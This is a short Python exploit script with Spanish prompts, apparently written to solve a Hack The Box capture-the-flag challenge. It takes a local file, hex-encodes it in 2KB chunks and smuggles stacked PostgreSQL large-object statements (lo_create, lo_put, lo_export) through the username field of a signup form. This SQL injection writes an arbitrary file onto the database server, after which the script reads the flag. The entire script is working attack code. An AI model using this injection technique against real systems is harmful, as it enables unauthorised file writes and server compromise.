from filesplit.split import Split
import os
import requests
import random
import re

ip_port = input("Digite la direccion IP del servidor donde esta alojado la aplicacion web vulnerable, y el numero de puerto. Ademas, deben estar separados por ':': ")
entrada = input("Digite la ruta absoluta del archivo del que desea cargar en el servidor web vulnerable, y la ruta absoluta del directorio donde se almacenaran los chunks de 2KB del archivo. Ademas, deben estar separados por una coma: ")
entrada_1 = entrada.split(',')
nombre_archivo = entrada_1[0].split('/')[-1]
split = Split(f"{entrada_1[0]}", f"{entrada_1[1]}")
split.bysize(2048)
contents = os.listdir(f"{entrada_1[1]}")
contents.remove("manifest")
contador = 0
payload = ""
oid = random.randint(10000,99999)
email = random.randint(0,200)
username = random.randint(0,500)
for i in reversed(contents):
	f = open(f"{entrada_1[1]}/{i}","rb")
	payload += f"SELECT lo_put({oid},{contador},decode($${f.read().hex()}$$,$$hex$$)); "
	contador +=2048
data = {"name":"test","username":f"trick123{username}','tricktus{email}@gmail.com','test'); SELECT lo_create({oid}); {payload}SELECT lo_export({oid},'/var/lib/postgresql/proof.txt');--","email":f"trick12356{email}@gmail.com","password":"test","repeatPassword":"test"}
respuesta = requests.post(f'http://{ip_port}/signup',data=data)
respuesta_1 = requests.get(f'http://{ip_port}/server-info')
match = re.search(r"HTB{.*}", respuesta_1.text)
print(f"La flag seria: {match.group(0)}")
